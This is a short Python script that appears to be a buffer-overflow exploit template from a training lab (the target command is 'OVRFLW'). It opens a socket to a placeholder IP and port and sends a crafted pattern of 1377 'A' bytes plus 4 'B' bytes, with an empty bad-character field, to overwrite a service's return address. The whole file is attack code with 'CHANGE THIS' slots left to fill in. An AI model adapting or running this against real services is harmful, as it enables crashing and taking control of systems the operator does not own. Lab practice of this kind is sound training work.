import socket, time, sys

ip = "XXXXX"  #CHANGE THIS
port = XXXX     #CHANGE THIS
timeout = 5

pattern = "A" * 1377 + "B" * 4 #CHANGE THIS 

badchars = ""

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(timeout)
connect = s.connect((ip, port))
s.recv(1024)
print("Sending pattern of %s bytes" % len(pattern))
s.send("OVRFLW " + pattern + badchars) #CHANGE THIS 
s.recv(1024)
s.close() 
